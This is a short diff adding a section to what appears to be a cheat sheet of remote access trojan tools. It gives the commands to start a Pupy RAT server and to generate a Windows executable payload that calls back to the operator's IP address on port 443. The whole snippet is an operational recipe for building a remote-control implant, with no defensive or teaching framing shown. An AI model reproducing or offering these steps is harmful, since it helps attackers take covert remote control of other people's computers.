@@ -1,0 +1,11 @@
+# =======================
+# 4. Pupy (Python-based RAT)
+# Purpose: Start pupy server and generate payload for Windows
+# =======================
+# Start server (pupysh.py should be executable):
+./pupysh.py
+
+# Generate payload:
+./pupygen.py -f exe_x86 -o pupy_payload.exe connect --host <your-IP>:443
+
+# =======================
